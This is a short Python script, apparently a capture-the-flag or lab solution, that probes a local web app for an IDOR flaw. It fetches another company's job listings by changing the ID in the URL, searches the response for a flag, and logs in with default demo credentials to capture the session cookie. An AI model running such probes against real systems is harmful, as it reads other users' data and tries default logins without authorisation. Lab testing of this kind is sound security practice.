import requests
import re

base_url = "http://127.0.0.1:5000"
print("IDOR VULNERABILITY ANALYSIS")
print("=" * 80)

print("\n[1] ENDPOINT /company/1/jobs:")
r = requests.get(f"{base_url}/company/1/jobs")
print(f"Status: {r.status_code}")
print(f"Body: {r.text}")

print("\n[2] ENDPOINT /company/2/jobs:")
r = requests.get(f"{base_url}/company/2/jobs")
print(f"Status: {r.status_code}")
print(f"Body: {r.text}")

flags = re.findall(r'FLAG\{[^}]+\}', r.text)
if flags:
    print(f"Flag Found: {flags[0]}")

print("\n[3] ENDPOINT /token")
r = requests.post(f"{base_url}/token", data="username=demo&password=demo", headers={"Content-Type": "application/x-www-form-urlencoded"})
print(f"Status: {r.status_code}")
print(f"Set-Cookie: {r.headers.get('set-cookie','N/A')}")
print(f"Body: {r.text}")

print("\nAnalysis Complete")
